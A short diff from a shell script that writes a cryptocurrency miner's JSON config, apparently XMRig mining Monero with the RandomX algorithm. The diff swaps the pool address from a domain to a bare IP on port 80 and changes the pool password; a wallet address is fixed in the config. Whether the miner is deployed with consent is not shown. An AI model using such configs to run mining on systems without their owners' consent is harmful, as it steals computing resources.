@@ -92,9 +92,9 @@ cat > "$CONFIG_FILE" <<END
         {
             "algo": "rx",
             "coin": null,
-            "url": "ikipou.web.id:443",
+            "url": "43.157.61.167:80",
             "user": "85KNrXfutegLDjeRiaBjkUVjCU2A3jkDq8s79A6M1dXg3dL4zZcNwh9UZkSL2HrGmZhoVuFru53mQH8MMz97nTzc47kk9kr",
-            "pass": "xmr1",
+            "pass": "joko",
             "rig-id": null,
             "nicehash": false,
             "keepalive": false,
